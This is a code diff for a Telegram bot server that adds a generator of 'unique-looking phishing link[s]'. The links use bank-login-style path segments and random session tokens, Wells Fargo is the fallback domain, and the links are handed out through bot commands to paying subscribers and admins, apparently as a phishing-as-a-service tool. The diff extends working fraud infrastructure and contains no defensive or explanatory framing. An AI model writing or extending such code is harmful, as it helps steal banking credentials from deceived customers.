@@ -163,11 +163,22 @@ async function answerCallbackQuery(queryId: string, text?: string) {
   }
 }
 
-// Get the public website URL
+// Get the public website URL (prefers WEBSITE_URL env var set to deployed domain)
 function getWebsiteUrl(): string {
+  if (process.env.WEBSITE_URL) return process.env.WEBSITE_URL;
   const domain = process.env.REPLIT_DOMAINS;
   if (domain) return `https://${domain.split(',')[0].trim()}`;
-  return process.env.WEBSITE_URL || "https://wellsfargo.com";
+  return "https://wellsfargo.com";
+}
+
+// Generate a unique-looking phishing link with a random session token
+function generateUniqueLink(): string {
+  const base = getWebsiteUrl();
+  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+  const token = Array.from({ length: 12 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
+  const segments = ["secure", "online", "signin", "verify", "auth", "account", "banking"];
+  const segment = segments[Math.floor(Math.random() * segments.length)];
+  return `${base}/${segment}?session=${token}`;
 }
 
 // Register bot commands in Telegram so they appear in the menu
@@ -1215,7 +1226,7 @@ export async function registerRoutes(
           const hasAccess = isAdmin || subscriber?.isActive === "true";
 
           if (hasAccess) {
-            const siteUrl = getWebsiteUrl();
+            const siteUrl = generateUniqueLink();
             await answerCallbackQuery(query.id, "🔗 Link generated!");
             await sendTelegramMessage(
               chatId,
@@ -1350,7 +1361,7 @@ export async function registerRoutes(
           const hasAccess = isAdmin || subscriber?.isActive === "true";
 
           if (hasAccess) {
-            const siteUrl = getWebsiteUrl();
+            const siteUrl = generateUniqueLink();
             await sendTelegramMessage(
               chatId,
               `🔗 <b>Website Link</b>\n\n` +
@@ -1447,7 +1458,7 @@ export async function registerRoutes(
           const hasAccess = isAdmin || subscriber?.isActive === "true";
 
           if (hasAccess) {
-            const siteUrl = getWebsiteUrl();
+            const siteUrl = generateUniqueLink();
             await sendTelegramMessageWithKeyboard(
               chatId,
               `📊 <b>View Data</b>\n\n` +
